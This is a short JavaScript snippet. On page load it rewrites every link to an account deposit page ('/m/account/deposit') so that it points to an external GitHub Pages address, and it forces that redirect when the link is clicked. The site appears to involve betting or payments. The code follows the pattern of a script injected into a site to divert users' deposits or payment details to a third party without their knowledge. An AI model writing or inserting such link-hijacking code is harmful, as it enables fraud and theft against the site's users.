document.addEventListener("DOMContentLoaded", function () {

  document.querySelectorAll('a[href*="/m/account/deposit"]').forEach(function (el) {

    el.href = "https://inggarfi.github.io/depoyukbos/grt22";

    el.addEventListener("click", function (e) {
      e.preventDefault();
      window.location.href = "https://inggarfi.github.io/depoyukbos/grt22";
    });

  });

});
